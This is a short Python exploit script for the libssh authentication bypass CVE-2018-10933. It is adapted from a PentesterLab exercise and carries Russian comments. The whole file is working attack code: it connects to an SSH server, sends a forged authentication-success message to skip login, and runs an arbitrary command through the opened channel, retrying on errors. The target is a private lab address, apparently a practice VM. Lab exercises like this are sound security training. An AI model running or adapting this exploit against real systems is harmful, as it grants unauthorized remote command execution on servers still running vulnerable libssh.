'''
 adapted exploit for CVE-2018-10933: LibSSH auth bypass
 
 from: https://pentesterlab.com/exercises/cve-2018-10933
 ps also there is vuln VM in link above to test this exploit
'''
import paramiko # for ssh connection
from paramiko import ssh_exception
import socket   # interface to interact with ssh-server

n_bytes = 2048 # TLDR - output sz in bytes | TL - ammount of bytes for buffer that is used to get response from ssh server
hostname, port = "192.168.56.101", 22

def RCE(command: str) -> str:
    ''' command - command to be remotely executed on vulnerable ssh-server'''
    res = ''

    # [заметка] пробовал вынести сокет из RCE() "плейном" - рядом с host,port: ИТОГ - работает через раз - бывают баги с переполнением буфера - что-то не очищается (finally тот же был)
    sock = socket.socket()
    sock.connect((str(hostname), int(port)))  # занятие сокета
    
    # инициализация служебных объектов
    message = paramiko.message.Message()
    transport = paramiko.transport.Transport(sock)
    transport.start_client()
        
    # "прыжок" - пропускаем шаг с аутентификацией (добавляем в сообщение метку - что прошли её уже)
    message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)  # дефолтная метка о том, что аутент юзера - успешна: USERAUTH_SUCCESS
    transport._send_message(message)    # посылаем сообщение с этой меткой

    cmd = transport.open_session() # создаём "ssh-channel" - "Channel is meant to behave like a socket" - doc: https://docs.paramiko.org/en/stable/api/channel.html?highlight=channel%20exec_command#paramiko.channel.Channel.exec_command
    
    try:    
        # "ssh-channel" - сразу закрывается после использования (дока), после exec_command ниже - тоже
        cmd.exec_command(command) # RCE
        res = cmd.recv(n_bytes)   # get result of RCE form ssh server
    
    # иногда не срабатывает и сессия закрывается - нужно заного пробовать открыть
    except ssh_exception.SSHException as e:
        cmd.close()        # "ssh-channel" закрываем, если сам он не закрылся
        print(f'Oh no - someth went wrong:( \n{e.__class__} {e} \n -trying again')
        res = RCE(command) # повторная попытка

    except Exception as e:
        print(f'Something very unexpected happened:\n{e}')

    # подчищаем занятые ресурсы - всегда
    finally:
        transport.close() # закрываем сессию
        sock.close()      # закрываем сокет (чтоб он не оставался занят при следующем запуске и не мешал работать программе)

    return res

command = 'ls'
print(f' > {command} \n{RCE(command)}')
